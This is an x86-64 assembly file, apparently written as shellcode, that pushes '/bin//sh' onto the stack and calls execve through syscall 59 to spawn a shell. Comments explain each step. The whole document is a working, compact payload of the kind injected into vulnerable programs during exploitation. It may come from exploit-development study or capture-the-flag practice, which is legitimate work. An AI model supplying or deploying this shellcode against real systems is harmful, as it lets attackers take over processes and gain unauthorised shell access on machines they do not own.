global _start

section .text

_start:
    ; [ null ]
    xor rdx, rdx                ; Zeroes rdx register
    push rdx                    ; Push null into stack
   
    ; [ /bin//sh | null ] 
    mov rax, 0x68732f2f6e69622f ; Moves /bin//sh into rax
    push rax                    ; Push /bin//sh into stack

    mov rdi, rsp                ; 1st arg : '/bin//sh'

    ; [ null | /bin//sh | null ]
    push rdx                    ; Push null into stack

    ; [ ptr to /bin//sh | null | /bin//sh | null ] 
    push rdi                    ; Push ptr to /bin//sh into stack 
    mov rsi, rsp                ; 2nd arg : ptr to '/bin//sh'

    ; execve('/bin//sh',['/bin//sh',null],null)  
    imul rax, rdx               ; To zero rax register
    add al, 59                  ; Syscall for execve()
    syscall                     ; Calls kernel
